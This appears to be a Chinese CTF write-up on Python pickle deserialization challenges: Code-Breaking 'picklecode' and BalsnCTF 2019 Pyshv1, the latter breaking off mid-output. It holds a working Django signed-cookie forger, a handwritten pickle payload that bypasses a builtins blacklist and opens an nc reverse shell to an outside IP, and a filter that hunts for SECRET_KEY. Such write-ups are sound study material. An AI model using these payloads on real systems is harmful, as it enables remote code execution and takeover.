<h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode">题目链接</a></p>
<p>代码审计发现在index处可以ssti</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    django_engine = engines[<span class="string">&#x27;django&#x27;</span>]</span><br><span class="line">    template = django_engine.from_string(<span class="string">&#x27;My name is &#x27;</span> + request.user.username)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(<span class="literal">None</span>, request))</span><br></pre></td></tr></table></figure>

<p>但是django难以利用ssti命令执行但是能读取敏感配置</p>
<p>结合serializer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span>(<span class="params">self, obj</span>):</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>和setting文件里的特殊配置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line">SESSION_SERIALIZER = <span class="string">&#x27;core.serializer.PickleSerializer&#x27;</span></span><br></pre></td></tr></table></figure>

<p>查阅django文档发现</p>
<p> <a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p>
<p>可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行</p>
<p>我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)</p>
<p>在理解之后便有一下生成恶意cookie的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> django.utils <span class="keyword">import</span> baseconv</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> constant_time_compare, salted_hmac</span><br><span class="line"><span class="keyword">from</span> django.utils.encoding <span class="keyword">import</span> force_bytes</span><br><span class="line"><span class="keyword">from</span> django.utils.module_loading <span class="keyword">import</span> import_string</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> core</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myexp=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRp100</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p101</span></span><br><span class="line"><span class="string">(g100</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp103</span></span><br><span class="line"><span class="string">g101</span></span><br><span class="line"><span class="string">(g103</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;eval(\&#x27;\&#x27;\&#x27;__import__(&#x27;os&#x27;).system(&#x27;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#x27;)\&#x27;\&#x27;\&#x27;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pickle_exp</span>(<span class="params">SECRET_KEY</span>):</span></span><br><span class="line">    data = myexp</span><br><span class="line">    compress=<span class="literal">True</span></span><br><span class="line">    <span class="comment"># Flag for if it&#x27;s been compressed or not</span></span><br><span class="line">    is_compressed = <span class="literal">False</span></span><br><span class="line">    salt=<span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> compress:</span><br><span class="line">        <span class="comment"># Avoid zlib dependency unless compress is being used</span></span><br><span class="line">        compressed = zlib.compress(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(compressed) &lt; (<span class="built_in">len</span>(data) - <span class="number">1</span>):</span><br><span class="line">            data = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">    base64d = signing.b64_encode(data).decode()</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">&#x27;.&#x27;</span> + base64d</span><br><span class="line">    <span class="built_in">print</span>(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle_exp(<span class="string">&quot;asdasdasdasdas&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来就是如何构造恶意的pickle代码的问题了</p>
<p>题目限制了只能加载builtins里的属性</p>
<p>且属性名不能为以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = &#123;&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;open&#x27;, &#x27;input&#x27;, &#x27;__import__&#x27;, &#x27;exit&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>__reduce__</code>来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了</p>
<p>我们现在把目光聚焦在如何构造利用链上</p>
<p>builtins的属性(删除部分)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals</p>
<p>虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处</p>
<p>所以<code>getattr(builtins,&quot;eval&quot;)</code>便能得到eval方法了</p>
<p>但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p>
<p>最后的payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p>
<p>其对应的pickle代码是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRp100</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p101</span></span><br><span class="line"><span class="string">(g100</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp103</span></span><br><span class="line"><span class="string">g101</span></span><br><span class="line"><span class="string">(g103</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;eval(\&#x27;\&#x27;\&#x27;__import__(&#x27;os&#x27;).system(&#x27;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#x27;)\&#x27;\&#x27;\&#x27;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后就差secret_key了,看别人的wp都是调试易得易得secret_key//</p>
<p>但是我是没找到,于是自己写了个过滤器</p>
<p>递归查找settings</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http.response <span class="keyword">import</span> HttpResponse, HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> engines</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> login <span class="keyword">as</span> auth_login, get_user_model, authenticate</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.views <span class="keyword">import</span> LoginView, logout_then_login</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.views <span class="keyword">import</span> generic</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line">register = template.Library()</span><br><span class="line"></span><br><span class="line"><span class="meta">@register.filter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span>(<span class="params">obj,way=<span class="string">&quot;&quot;</span>,depth=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> depth&gt;<span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    objdir=<span class="built_in">dir</span>(obj)</span><br><span class="line">    r=&#123;<span class="string">&quot;dict&quot;</span>:objdir,<span class="string">&quot;way&quot;</span>:way&#125;</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> objdir:            </span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span> == i[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>)!=<span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] == django.__name__:</span><br><span class="line">                result+=get_dict(<span class="built_in">getattr</span>(obj,i,<span class="literal">None</span>),way+<span class="string">&quot;.&quot;</span>+i,depth+<span class="number">1</span>) </span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SECRET_KEY&quot;</span> <span class="keyword">in</span> objdir <span class="keyword">or</span> <span class="string">&quot;settings&quot;</span> <span class="keyword">in</span> objdir:</span><br><span class="line">        <span class="built_in">print</span>(way)</span><br><span class="line">        <span class="keyword">return</span> result+way+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>这次是真的易得了:),至此结束</p>
<h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br></pre></td></tr></table></figure>

<p>只允许sys里的属性,而且属性里不能有.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;__displayhook__&#x27;, &#x27;__doc__&#x27;, &#x27;__excepthook__&#x27;, &#x27;__interactivehook__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;__stderr__&#x27;, &#x27;__stdin__&#x27;, &#x27;__stdout__&#x27;, &#x27;_clear_type_cache&#x27;, &#x27;_current_frames&#x27;, &#x27;_debugmallocstats&#x27;, &#x27;_getframe&#x27;, &#x27;_git&#x27;, &#x27;_home&#x27;, &#x27;_xoptions&#x27;, &#x27;abiflags&#x27;, &#x27;api_version&#x27;, &#x27;argv&#x27;, &#x27;base_exec_prefix&#x27;, &#x27;base_prefix&#x27;, &#x27;builtin_module_names&#x27;, &#x27;byteorder&#x27;, &#x27;call_tracing&#x27;, &#x27;callstats&#x27;, &#x27;copyright&#x27;, &#x27;displayhook&#x27;, &#x27;dont_write_bytecode&#x27;, &#x27;exc_info&#x27;, &#x27;excepthook&#x27;, &#x27;exec_prefix&#x27;, &#x27;executable&#x27;, &#x27;exit&#x27;, &#x27;flags&#x27;, &#x27;float_info&#x27;, &#x27;float_repr_style&#x27;, &#x27;get_asyncgen_hooks&#x27;, &#x27;get_coroutine_wrapper&#x27;, &#x27;getallocatedblocks&#x27;, &#x27;getcheckinterval&#x27;, &#x27;getdefaultencoding&#x27;, &#x27;getdlopenflags&#x27;, &#x27;getfilesystemencodeerrors&#x27;, &#x27;getfilesystemencoding&#x27;, &#x27;getprofile&#x27;, &#x27;getrecursionlimit&#x27;, &#x27;getrefcount&#x27;, &#x27;getsizeof&#x27;, &#x27;getswitchinterval&#x27;, &#x27;gettrace&#x27;, &#x27;hash_info&#x27;, &#x27;hexversion&#x27;, &#x27;implementation&#x27;, &#x27;int_info&#x27;, &#x27;intern&#x27;, &#x27;is_finalizing&#x27;, &#x27;last_traceback&#x27;, &#x27;last_type&#x27;, &#x27;last_value&#x27;, &#x27;maxsize&#x27;, &#x27;maxunicode&#x27;, &#x27;meta_path&#x27;, &#x27;modules&#x27;, &#x27;path&#x27;, &#x27;path_hooks&#x27;, &#x27;path_importer_cache&#x27;, &#x27;platform&#x27;, &#x27;prefix&#x27;, &#x27;ps1&#x27;, &#x27;ps2&#x27;, &#x27;set_asyncgen_hooks&#x27;, &#x27;set_coroutine_wrapper&#x27;, &#x27;setcheckinterval&#x27;, &#x27;setdlopenflags&#x27;, &#x27;setprofile&#x27;, &#x27;setrecursionlimit&#x27;, &#x27;setswitchinterval&#x27;, &#x27;settrace&#x27;, &#x27;stderr&#x27;, &#x27;stdin&#x27;, &#x27;stdout&#x27;, &#x27;thread_info&#x27;, &#x27;version&#x27;, &#x27;version_info&#x27;, &#x27;warnoptions&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现有个modules,但是loads那里有一个死亡raise</p>
<p><code> sys._getframe</code> 可以返回带有exec的字典,但是好像没啥用</p>
<p>现在问题是不知道如何取出modules里的值</p>
<p>阅读文档发现</p>
<blockquote>
<p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p>
</blockquote>
<p>可以修改modules来修改模块内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; import sys</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; sys.modules[<span class="string">&#x27;sys&#x27;</span>]=sys.modules</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; import sys</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; dir(sys)</span></span><br><span class="line">[&#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__delitem__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__iter__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, 